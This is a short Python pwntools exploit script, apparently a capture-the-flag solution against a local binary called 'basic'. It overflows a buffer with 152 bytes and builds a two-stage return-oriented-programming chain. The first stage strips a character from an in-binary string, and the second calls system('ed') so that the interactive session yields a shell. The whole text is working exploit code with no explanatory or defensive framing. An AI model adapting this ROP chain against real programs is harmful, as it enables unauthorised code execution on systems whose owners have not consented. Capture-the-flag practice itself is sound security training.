#Author : Kerro
from pwn import *
elf = ELF("./basic")
pop_rdi = 0x400743 #pop rdi ; ret ;
system_plt= elf.symbols['system']
main = elf.symbols['main']
ff = 0x400657 #function that deletes last char of string
ed = 0x601060 #string exhausted!
edt = ed + 7 #the word ed!
p = process("./basic")
# stage 1: remove "!" from "exhausted!" with the given function ff
payload = ""
payload += "A"*152
payload += p64(pop_rdi)
payload += p64(ed)
payload += p64(ff)
# stage 2  : run system("ed")
payload += p64(pop_rdi)
payload += p64(edt)
payload += p64(system_plt)
p.sendline(payload)
p.interactive()
 
